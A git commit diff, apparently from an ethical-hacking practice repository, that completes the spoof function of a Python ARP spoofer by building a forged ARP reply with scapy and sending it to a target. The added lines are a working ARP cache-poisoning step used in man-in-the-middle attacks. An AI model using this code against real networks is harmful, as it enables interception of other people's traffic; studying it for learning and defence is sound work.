86e6489906f803e91287f0904ad2defbc82bfece
Crescentdark <114867953+Crescentdark@users.noreply.github.com>
2023-10-11 17:40:56 +0200

    Add packet and finish spoof function

--- Ethicalhackwiz/arp_spoofer.py
+++ Ethicalhackwiz/arp_spoofer.py
@@ -12,3 +12,5 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet)
